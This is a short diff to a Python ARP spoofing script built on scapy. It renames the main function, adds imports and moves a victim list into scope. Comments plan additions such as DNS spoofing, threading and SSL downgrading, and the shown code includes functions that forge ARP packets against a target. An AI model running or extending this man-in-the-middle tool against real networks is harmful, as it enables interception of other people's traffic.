@@ -3,9 +3,11 @@
 import time
 import sys
 import scapy.all as scapy
+import os
+import argparse
+
 # MAC address function which will return
 # the mac_address of the provided ip address
-victim_addresses = [] 
  
 def get_mac(ip):
     # creating an ARP request to the ip address
@@ -36,13 +38,14 @@ def arp_spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
  
 
-def main():
+def arp_main():
     # TOADD: 
     # - arguments: silent/allin, autoscan/manualinput, dns things, input for all addresses
     # - threads
     # - ssl downgrading
     # victim_ip = input()  # taking the victim ip_address
     # router_ip = input()  # taking the router ip address
+    victim_addresses = [] 
     sent_packets_count = 0  # initializing the packet counter
 
     while True:
